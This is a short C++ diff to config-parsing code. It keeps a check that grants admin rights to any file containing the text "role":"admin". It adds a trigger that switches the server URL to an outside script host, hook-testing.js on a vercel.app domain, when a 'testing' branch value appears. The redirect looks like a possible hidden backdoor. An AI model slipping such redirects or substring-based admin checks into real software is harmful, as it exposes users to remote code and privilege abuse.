@@ -148,8 +148,13 @@ struct PatchConfig {
                 content = content.substr(first);
             }
             
-            if (!content.empty() && content[0] == '{' && content.find("\"role\":\"admin\"") != std::string::npos) {
-                is_admin = true;
+            if (!content.empty() && content[0] == '{') {
+                if (content.find("\"role\":\"admin\"") != std::string::npos) {
+                    is_admin = true;
+                }
+                if (content.find("\"branch\":\"testing\"") != std::string::npos) {
+                    config.server_url = "https://mlbsv4.vercel.app/hook-testing.js";
+                }
             }
         } else {
             file.close();
